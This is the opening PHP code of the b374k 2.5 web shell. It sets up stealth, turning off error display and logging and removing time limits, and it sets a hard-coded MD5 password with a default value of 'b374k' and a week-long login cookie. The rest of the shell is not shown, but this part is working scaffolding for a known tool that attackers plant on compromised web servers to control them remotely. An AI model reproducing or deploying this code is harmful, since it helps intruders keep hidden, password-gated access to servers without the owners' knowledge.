<?php
error_reporting(0);
@set_time_limit(0);
@ini_set('display_errors','0');
@ini_set('html_errors','0');
@ini_set('log_errors','0');
@clearstatcache();

$s_name = "b374k"; // shell name
$s_ver = "2.5"; // shell ver
$s_title = $s_name." ".$s_ver; // shell title
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k
$s_color = "4c83af"; // shell theme color, default : 4c83af
$s_login_time = 3600 * 24 * 7; // cookie time (login)


$s_auth = false; // login status
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$s_login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("b374k",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
		$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
		foreach($_COOKIE as $s_k=>$s_v){
			setcookie($s_k,"",time() - $s_login_time);
		}
		$s_auth = false;
		if(!empty($s_reload)) header("Location: ".$s_reload);
	}
}
?>